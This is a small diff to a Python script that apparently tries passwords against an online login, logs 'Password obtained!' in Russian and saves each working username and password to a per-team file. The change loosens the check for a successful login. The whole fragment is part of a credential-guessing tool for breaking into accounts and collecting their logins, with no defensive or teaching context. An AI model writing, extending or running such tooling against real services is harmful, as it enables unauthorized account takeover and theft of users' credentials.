@@ -39,7 +39,7 @@ def start(password, team):
                           headers={"X-Requested-With": X_REQUESTED_WITH,
                                    "User-Agent": USER_AGENT}) # пытатаемся войти в акк
 
-        if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
+        if str(r) == f"<Response [{str(OK_RESPONSE)}]>" or r.text.find("this network") > -1:
             log.info(f"Пароль получен! ({r}) {username}: {password}")
             with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                 h_list.write(f"{get_ts()} {r} {username}: {password} \n")
